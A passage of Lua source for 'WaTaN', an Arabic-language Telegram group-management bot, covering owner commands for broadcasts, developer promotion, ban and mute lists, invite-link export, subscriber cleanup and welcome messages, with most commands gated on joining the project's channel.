local List = database:smembers(bot_id.."WaTaN:ProGroups")
local WaTaN = '✯︙المجموعات المدفوعه \n✯︙تاريخ اليوم '..os.date("%Y/%m/%d")..' \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n'
for k,v in pairs(List) do
local WaTaNgetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
if WaTaNgetlink.ok == true then 
link_WaTaN = '['..WaTaNgetlink.result..']'
else
link_WaTaN = 'ليست لدي صلاحية الدعوه لهذه المجموعه'
end
WaTaN = WaTaN..k.."- (`"..v.."`) ~ (`"..database:get(bot_id.."WaTaN:ProGroups:Time"..v).."`) \n- "..link_WaTaN.." \n" 
end
if #List == 0 then
WaTaN = '✯︙لاتوجد مجموعات مدفوعه'
end
send(msg.chat_id_, msg.id_,WaTaN) 
end
if text == 'جلب ملف السورس ✯' then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط ')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './WaTaN.lua', '✯︙نسخة ملف سورس وطن')
end 
end
if (text == "تغير المطور الاساسي ✯") and msg.reply_to_message_id_ == 0 and DevWaTaN(msg) then 
send(msg.chat_id_, msg.id_,'✯︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
database:setex(bot_id.."Abs:EditDev"..msg.sender_user_id_,300,true)
end
if database:get(bot_id.."Abs:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'✯︙تم الغاء امر تغير المطور الاساسي')
database:del(bot_id.."Abs:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
database:del(bot_id.."Abs:EditDev"..msg.sender_user_id_)
database:set(bot_id.."Abs:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n✯︙المعرف : [@'..dp.username_..']' else DevUser = '' end
local Text = '✯︙الايدي : '..dp.id_..DevUser..'\n✯︙الاسم : ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n✯︙تم حفظ المعلومات بنجاح\n✯︙استخدم الازرار للتاكيد :'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/setyes"},{text="لا",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"✯︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
database:del(bot_id.."Abs:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
if text == 'جلب روابط الكروبات ✯' then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط ')
else
local List = database:smembers(bot_id..'Chek:Groups')
if #List == 0 then
send(msg.chat_id_, msg.id_,'✯︙لا توجد مجموعات مفعله')
else
send(msg.chat_id_, msg.id_,'✯︙جاري ارسال نسخه تحتوي على : '..#List..' مجموعه')
local Text = "✯︙Source WaTaN\n✯︙File Bot Groups\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(List) do
local GroupsManagers = database:scard(bot_id.."Manager"..v) or 0
local GroupsAdmins = database:scard(bot_id.."Mod:User"..v) or 0
local Groupslink = database:get(bot_id.."Private:Group:Link"..v)
Text = Text..k.." : \n✯︙Group ID : "..v.."\n✯︙Group Link : "..(Groupslink or "Not Found").."\n✯︙Group Managers : "..GroupsManagers.."\n✯︙Group Admins : "..GroupsAdmins.."\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
if text == 'المطور الاساسي ✯' then
local TEXT_SUDO = database:get(bot_id..'TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
end,nil)
end
end

if text == 'تفعيل الاذاعه ✯' and DevWaTaN(msg) then  
if database:get(bot_id..'Bc:Bots') then
database:del(bot_id..'Bc:Bots') 
Text = '\n✯︙تم تفعيل الاذاعه' 
else
Text = '\n✯︙بالتاكيد تم تفعيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الاذاعه ✯' and DevWaTaN(msg) then  
if not database:get(bot_id..'Bc:Bots') then
database:set(bot_id..'Bc:Bots',true) 
Text = '\n✯︙تم تعطيل الاذاعه' 
else
Text = '\n✯︙بالتاكيد تم تعطيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == ("مسح المحظورين عام ✯") and DevWaTaN(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح المحظورين عام')
return false
end
if text == ("مسح المكتومين عام ✯") and DevWaTaN(msg) then
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح قائمه المكتومين عام')
return false
end
if text == 'الاصـدار ✯' and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'✯︙اصدار سورس وطن \n✯︙الاصدار »{ v 3.2 }')
end
if text == "ضع اسم للبوت ✯" and DevWaTaN(msg) then  
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات ✯' and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' الاحصائيات ✯ \n'..'✯︙عدد الكروبات » {'..Groups..'}'..'\n✯︙عدد المشتركين » {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'المشتركين ✯' and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n✯︙المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'الكروبات ✯' and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n✯︙الكروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == ("المطورين ✯") and DevWaTaN(msg) then
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local list = database:smembers(bot_id..'Sudo:User')
t = "\n✯︙قائمة المطورين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("الثانويين ✯") and DevWaTaN(msg) then
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local list = database:smembers(bot_id..'Dev:WaTaN:2')
t = "\n✯︙قائمة الثانويين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "قناة التحديثات ✯" and DevWaTaN(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس وطن*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝚆𝙰𝚃𝙰𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/WaTaNTeaM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(updatech).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("المحظورين عام ✯") and DevWaTaN(msg) then
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local list = database:smembers(bot_id..'GBan:User')
t = "\n✯︙قائمه المحظورين عام \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("قائمه الكتم العام ✯") and DevWaTaN(msg) then
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local list = database:smembers(bot_id..'Gmute:User')
t = "\n✯︙قائمة المكتومين عام \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="اذاعه خاص ✯" and msg.reply_to_message_id_ == 0 and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل الان اذاعتك؟ \n✯︙للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ✯" and msg.reply_to_message_id_ == 0 and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل الان اذاعتك؟ \n✯︙للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ✯" and msg.reply_to_message_id_ == 0 and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل الان اذاعتك؟ \n✯︙للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ✯" and msg.reply_to_message_id_ == 0  and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ✯" and msg.reply_to_message_id_ == 0  and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ✯' and DevWaTaN(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ✯" and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'✯︙لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'✯︙عدد المشتركين الان » ( '..#pv..' )\n✯︙تم ازالة » ( '..sendok..' ) من المشتركين\n✯︙الان عدد المشتركين الحقيقي » ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end


if text and text:match("^رفع مطور @(.*)$") and DevWaTaN(msg) and ChanSub(msg) then
local username = text:match("^رفع مطور @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مطور'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and DevWaTaN(msg) and ChanSub(msg) then
local userid = text:match("^رفع مطور (%d+)$")
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and DevWaTaN(msg) and ChanSub(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المطورين'
texts = usertext..status
else
texts = '✯︙لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and DevWaTaN(msg) and ChanSub(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end

end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and not Special(msg) then  
local WaTaN1_Msg = database:get(bot_id.."WaTaN1:Add:Filter:Rp2"..text..msg.chat_id_)   
if WaTaN1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙'..WaTaN1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
end
if database:get(bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✯' then   
send(msg.chat_id_, msg.id_," ✯︙تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " ✯︙تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✯' then   
send(msg.chat_id_, msg.id_," ✯︙تم الغاء الاذاعه للخاص")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'User_Bot') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ✯︙تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✯' then   
send(msg.chat_id_, msg.id_," ✯︙تم الغاء الاذاعه")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Chek:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
if not database:sismember(bot_id..'WaTaN:ProGroups',v) then
send(v, 0,'['..msg.content_.text_..']')  
end
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
if not database:sismember(bot_id..'WaTaN:ProGroups',v) then
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
if not database:sismember(bot_id..'WaTaN:ProGroups',v) then
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
if not database:sismember(bot_id..'WaTaN:ProGroups',v) then
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end
end 
end
send(msg.chat_id_, msg.id_," ✯︙تمت الاذاعه الى >>{"..#list.."} كروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✯' then   
send(msg.chat_id_, msg.id_," ✯︙تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'Chek:Groups')   
for k,v in pairs(list) do  
if not database:sismember(bot_id..'WaTaN:ProGroups',v) then
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end
end   
send(msg.chat_id_, msg.id_," ✯︙تمت الاذاعه الى >>{"..#list.."} كروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✯' then   
send(msg.chat_id_, msg.id_," ✯︙تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'User_Bot')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ✯︙تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id..'database4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "✯︙تم الغاء الامر")
database:del(bot_id..'database4'..msg.sender_user_id_)
return false  end 
database:del(bot_id..'database4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '✯︙المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '✯︙عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '✯︙عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'✯︙البوت ادمن في القناة \n✯︙تم تفعيل الاشتراك الاجباري \n✯︙ايدي القناة ↫ '..data.id_..'\n✯︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
database:set(bot_id..'Abs:ChId',data.id_)
else
send(msg.chat_id_, msg.id_,'✯︙عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end

local status_welcome = database:get(bot_id..'Chek:Welcome'..msg.chat_id_)
if status_welcome and not database:get(bot_id..'lock:tagservr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = '\n• نورت حبي \n•  name \n• user' 
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
send(msg.chat_id_, msg.id_,'['..t..']')
end,nil) 
end 
end 
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.content_.photo_ then  
if database:get(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
